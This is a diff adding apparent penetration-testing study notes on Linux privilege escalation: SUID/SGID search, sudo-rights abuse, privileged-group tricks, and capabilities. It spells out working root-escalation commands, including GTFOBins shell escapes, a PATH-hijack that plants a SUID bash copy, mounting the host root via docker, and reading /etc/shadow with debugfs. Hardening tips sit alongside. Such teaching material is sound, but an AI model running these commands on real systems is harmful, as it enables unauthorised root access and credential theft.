@@ -107,6 +107,53 @@ nmap --interactive   # then  !sh   (old nmap)
 ```
 > Restricted-shell escape = "which allowed binary has a GTFOBins shell-escape?" Enumerate the allowed commands, then look each up. `vi`/`less`/`awk`/any scripting language almost always works.
 
+## SUID / SGID (detail)
+`setuid` runs a binary as its **owner** (root = root privs); shows as `-rwsr-xr-x`. `setgid` = group's privs.
+```bash
+find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null     # SUID
+find / -perm -2000 -exec ls -ldb {} \; 2>/dev/null     # SGID
+```
+For each unusual binary → **GTFOBins** for the SUID escape (use the `-p` variant to keep euid):
+```bash
+find / -exec /bin/sh -p \; -quit     # if find is SUID
+vim -c ':!/bin/sh'                    # if vim is SUID
+less /etc/passwd    # then !/bin/sh
+```
+
+## Sudo rights abuse
+```bash
+sudo -l                               # the single most important check
+```
+- **GTFOBins binaries** allowed via sudo → instant root: `sudo vim -c ':!/bin/sh'`, `sudo awk 'BEGIN{system("/bin/sh")}'`, `sudo find . -exec /bin/bash \;`, `sudo zip -TT 'sh #' /dev/null`, `sudo less /etc/passwd` then `!sh`.
+- **Command without absolute path** in sudoers → PATH-hijack it: drop a malicious binary of that name in a writable `$PATH` dir (e.g. one that does `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash`, then `/tmp/rootbash -p`).
+- **sudo tcpdump `-z`** runs a postrotate *script as root* — point it at your script (reverse-shell payload not stored here; the mechanism is "root runs my script").
+- **sudo tar/rsync with wildcards** → the wildcard-abuse trick (above) to append a NOPASSWD sudoers line.
+- **sudo systemctl** → it can start a unit that runs an arbitrary `ExecStart` as root.
+Harden: `visudo -c`, absolute paths, no blanket `ALL`, minimal NOPASSWD.
+
+## Privileged group abuse
+| Group | Escalation |
+|---|---|
+| **lxd / lxc** | import a small image → `lxc init ... -c security.privileged=true` → mount host `/` into the container → read/write root files |
+| **docker** | `docker run -v /:/mnt -it <img>` → host filesystem mounted as root inside the container |
+| **disk** | `debugfs /dev/sda1` → read any file (e.g. /etc/shadow) raw, bypassing permissions |
+| **adm** | read `/var/log/*` (auth.log, syslog, apache) → creds/tokens in logs |
+
+## Linux capabilities
+Capabilities = fine-grained slices of root. A binary granted a dangerous one = privesc.
+```bash
+getcap -r / 2>/dev/null
+find /usr/bin /usr/sbin /usr/local/bin -type f -exec getcap {} \; 2>/dev/null
+cat /proc/self/status | grep Cap        # my capability sets
+```
+Dangerous caps and abuse:
+- **cap_setuid** → a tiny libcap program that calls `setuid(0)` then execs a shell = root (PoC source not stored; the point is the cap grants root).
+- **cap_dac_override** → bypass file permission checks: read/overwrite `/etc/shadow`, `/etc/passwd`, or a SUID binary (e.g. via `vim.basic` with that cap).
+- **cap_sys_admin** → mount, broad admin ops.
+Harden: least privilege for caps, audit with `getcap -r /`, `auditd` on setcap/capset.
+
+> The whole module reduces to a priority list: `sudo -l` → SUID+GTFOBins → **capabilities (getcap)** → privileged groups (id) → cron/wildcards → kernel last. `getcap -r /` is the check people forget — a `cap_setuid` binary is as good as a SUID root one.
+
 ## Linux hardening (defense / report side)
 - **Patching:** automate — `unattended-upgrades` (Debian/Ubuntu), `yum-cron`/`dnf-automatic` (RHEL).
 - **Config:** audit SUID/SGID + world-writable; absolute paths in cron/sudo; no creds in files/history; remove unused packages/services; SELinux or AppArmor enforcing.
